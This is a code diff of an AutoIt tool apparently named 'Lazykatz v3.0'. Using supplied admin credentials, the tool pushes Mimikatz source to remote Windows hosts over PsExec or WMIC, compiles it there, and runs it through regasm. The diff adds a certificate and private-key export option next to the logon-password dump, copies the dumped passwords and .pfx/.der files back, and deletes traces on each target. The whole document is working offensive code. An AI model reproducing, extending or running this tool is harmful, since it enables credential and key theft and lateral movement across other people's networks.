@@ -20,21 +20,23 @@ Global $dir = @WorkingDir
 FileDelete(@TempDir & "\psexec.exe")
 FileInstall("PsExec.exe", @TempDir & "\psexec.exe")
 FileInstall("katz.cs", @TempDir & "\katz.cs")
-FileInstall("key.snk", @TempDir & "\key.snk")
 
-$Form1 = GUICreate("Lazykatz v3.0", 622, 448, 192, 125)
-GUICtrlCreateLabel("*** LAZYKATZ LOG ***", 415, 40, 150, 25)
-Global $idEdit = GUICtrlCreateedit("", 350, 60, 250, 350)
+$Form1 = GUICreate("Lazykatz v3.0", 700, 448, 192, 125)
+GUICtrlCreateLabel("*** LAZYKATZ LOG ***", 490, 40, 150, 25)
+Global $idEdit = GUICtrlCreateedit("", 430, 60, 250, 350)
 GUICtrlCreateLabel("Username", 80, 40, 90, 25)
 GUICtrlCreateLabel("Password", 80, 100, 90, 25)
 GUICtrlCreateLabel("Choose IP list", 80, 155, 90, 25)
 GUICtrlCreateLabel("Choose Method", 80, 215, 90, 25)
+GUICtrlCreateLabel("Choose Attack", 80, 265, 90, 25)
 Global $USER1 = GUICtrlCreateInput("", 180, 40, 90, 25)
 Global $PASS1 = GUICtrlCreateInput("", 180, 100, 90, 25,0x0020)
 $Button1 = GUICtrlCreateButton("Browse", 180, 150, 81, 25)
 $run = GUICtrlCreateButton("Start",120, 320, 120, 25)
 $radio1 = GUICtrlCreateRadio("PsExec",180, 210, 50, 25)
-$radio2 = GUICtrlCreateRadio("WMIC",250, 210, 50, 25)
+$radio2 = GUICtrlCreateRadio("WMIC",300, 210, 50, 25)
+$check1 = GUICtrlCreateCheckbox("Logon passwords",180, 260, 100, 25)
+$check2 = GUICtrlCreateCheckbox("Export certs",300, 260, 100, 25)
 Global $log = ""
 GUISetState(@SW_SHOW)
 
@@ -60,6 +62,10 @@ While 1
     ;;;;;;;
     EndSelect
 WEnd
+
+Func _IsChecked($idControlID)
+    Return BitAND(GUICtrlRead($idControlID), $GUI_CHECKED) = $GUI_CHECKED
+EndFunc   ;==>_IsChecked
 
 ; ATTACK FUNTION
 Func attack()
@@ -111,9 +117,7 @@ if not $status = 0 Then
 if $method = "psexec" Then
 		logprint("Uploading files on target using PsExec" & @CRLF)
 	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\katz.cs","",@SW_HIDE,0x10000)
-	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\key.snk","",@SW_HIDE,0x10000)
 	RunWait(@ComSpec & " /C " & "copy /Y katz.cs \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)
-	RunWait(@ComSpec & " /C " & "copy /Y key.snk \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)
 	RunWait(@ComSpec & " /C " & "psexec.exe /accepteula \\"&$ip&" -u "&$user&" -p "&$pass&' -s -h systeminfo | find /I "System Type:" > os.txt',"",@SW_HIDE,0x10000)
 EndIf
 
@@ -135,9 +139,7 @@ if $method = "wmic" Then
 	WEnd
 	logprint("Uploading files on remote share using WMIC" & @CRLF)
 	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\katz.cs","",@SW_HIDE,0x10000)
-	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\key.snk","",@SW_HIDE,0x10000)
 	RunWait(@ComSpec & " /C " & "copy /Y katz.cs \\"&$ip&"\test$\","",@SW_HIDE,0x10000)
-	RunWait(@ComSpec & " /C " & "copy /Y key.snk \\"&$ip&"\test$\","",@SW_HIDE,0x10000)
 
 	RunWait(@ComSpec & " /C " & 'wmic /node:'&$ip&' /user:'&$user&' /password:'&$pass &' os get osarchitecture > os.txt 2>&1',"",@SW_HIDE,0x10000)
 
@@ -192,8 +194,13 @@ logprint("Will use .NET Firmware "&$fw&"" & @CRLF)
 ; GENERATING LAZY.BAT
 if $fw Then
 RunWait(@ComSpec & " /C " & "echo @echo off > lazy.bat","",@SW_HIDE,0x10000)
-RunWait(@ComSpec & " /C " & "echo C:\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&"\csc.exe /r:System.EnterpriseServices.dll /out:c:\windows\temp\mimi.exe /keyfile:c:\windows\temp\key.snk /unsafe c:\windows\temp\katz.cs >> lazy.bat","",@SW_HIDE,0x10000)
-RunWait(@ComSpec & " /C " & "echo C:\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&'\regasm.exe c:\windows\temp\mimi.exe "log c:\windows\temp\mimikatz.log" "privilege::debug" "sekurlsa::logonPasswords full" "exit" >> lazy.bat',"",@SW_HIDE,0x10000)
+RunWait(@ComSpec & " /C " & "echo C:\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&"\csc.exe /r:System.EnterpriseServices.dll /out:c:\windows\temp\mimi.exe /unsafe c:\windows\temp\katz.cs >> lazy.bat","",@SW_HIDE,0x10000)
+if _IsChecked($check1) Then
+	RunWait(@ComSpec & " /C " & "echo C:\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&'\regasm.exe c:\windows\temp\mimi.exe "log c:\windows\temp\mimikatz.log" "privilege::debug" "sekurlsa::logonPasswords full" "exit" >> lazy.bat',"",@SW_HIDE,0x10000)
+EndIf
+if _IsChecked($check2) Then
+	RunWait(@ComSpec & " /C " & "echo C:\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&'\regasm.exe c:\windows\temp\mimi.exe "crypto::capi" "crypto::certificates /export" "exit" >> lazy.bat',"",@SW_HIDE,0x10000)
+EndIf
 
 ;---------------------------------
 ;COPY LAZY.BAT ON TARGET
@@ -225,11 +232,20 @@ logprint("Executed lazy.bat on target" & @CRLF)
 
 if $method = "psexec" Then
 	logprint("Copying mimikatz.log from target" & @CRLF)
-	RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\mimikatz.log "&$dir&"\mimikatz_"&$ip&".log" ,"",@SW_HIDE,0x10000)
+	if _IsChecked($check1) Then
+		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\mimikatz.log "&$dir&"\mimikatz_"&$ip&".log" ,"",@SW_HIDE,0x10000)
+	EndIf
+	if _IsChecked($check2) Then
+		RunWait(@ComSpec & " /C " & "mkdir "&$dir&"\certs_"&$ip,"",@SW_HIDE,0x10000)
+		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\*.der "&$dir&"\certs_"&$ip&"\" ,"",@SW_HIDE,0x10000)
+		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\*.pfx "&$dir&"\certs_"&$ip&"\" ,"",@SW_HIDE,0x10000)
+	EndIf
+
 	logprint("Cleaning uploded files and established session" & @CRLF)
 	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\katz.cs","",@SW_HIDE,0x10000)
-	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\key.snk","",@SW_HIDE,0x10000)
 	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimikatz.log","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\*.der","",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\*.pfx","",@SW_HIDE,0x10000)
 	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimi.exe","",@SW_HIDE,0x10000)
 	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\lazy.bat","",@SW_HIDE,0x10000)
 	RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\c$ /delete","",@SW_HIDE,0x10000)
@@ -240,14 +256,22 @@ if $method = "wmic" Then
 	WEnd
 	logprint("Cleaning uploded files" & @CRLF)
 	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\katz.cs","",@SW_HIDE,0x10000)
-	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\key.snk","",@SW_HIDE,0x10000)
 	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\mimi.exe","",@SW_HIDE,0x10000)
 	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\lazy.bat","",@SW_HIDE,0x10000)
 	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\test.bat","",@SW_HIDE,0x10000)
 	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\framework.txt","",@SW_HIDE,0x10000)
 	logprint("Copying mimikatz.log from target" & @CRLF)
-	RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\test$\mimikatz.log "&$dir&"\mimikatz_"&$ip&".log" ,"",@SW_HIDE,0x10000)
-	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\mimikatz.log","",@SW_HIDE,0x10000)
+	if _IsChecked($check1) Then
+		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\test$\mimikatz.log "&$dir&"\mimikatz_"&$ip&".log" ,"",@SW_HIDE,0x10000)
+		RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\mimikatz.log","",@SW_HIDE,0x10000)
+	EndIf
+	if _IsChecked($check2) Then
+		RunWait(@ComSpec & " /C " & "mkdir "&$dir&"\certs_"&$ip,"",@SW_HIDE,0x10000)
+		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\test$\*.der "&$dir&"\certs_"&$ip&"\" ,"",@SW_HIDE,0x10000)
+		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\test$\*.pfx "&$dir&"\certs_"&$ip&"\" ,"",@SW_HIDE,0x10000)
+		RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\*.der","",@SW_HIDE,0x10000)
+		RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\*.pfx","",@SW_HIDE,0x10000)
+	EndIf
 	While FileExists("\\"&$ip&"\test$")
 		logprint("Disabling temporary remote share" & @CRLF)
 		RunWait(@ComSpec & " /C " & 'wmic  /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' SHARE where name="test$" call delete',"",@SW_HIDE,0x10000)
